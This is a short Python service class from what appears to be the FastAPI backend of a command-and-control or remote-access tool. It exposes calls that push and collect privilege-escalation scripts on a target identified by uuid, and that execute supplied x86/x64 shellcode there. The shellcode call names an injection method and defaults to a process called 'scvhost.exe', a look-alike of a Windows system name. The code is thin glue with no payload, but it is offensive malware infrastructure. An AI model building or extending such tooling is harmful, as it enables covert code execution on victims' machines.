from modules.ExploitModule import ExploitModule
from dataManager.repository.userRepository import UserRepository
from fastapi import HTTPException
import logging

class ExploitService:
    def __init__(self, exploit_module: ExploitModule, user_repository: UserRepository):
        self.exploit_module = exploit_module
        self.user_repository = user_repository

    async def send_peas(self, id: str):
        return await self.exploit_module.send_peas(id)

    async def receive_peas(self, id: str):
        return await self.exploit_module.receive_peas(id)
    
    async def exec_shellcode(self, id: str, shellcode_x86: str, shellcode_x64:str, method: str = "self-exec", prefered_process:str = "scvhost.exe"):
        try:
            logging.info(f"Executing shellcode on user with uuid {id}")
            return await self.exploit_module.exec_shellcode(id, shellcode_x86, shellcode_x64, method, prefered_process)
        except Exception as e:
            raise HTTPException(status_code=400, detail=str(e))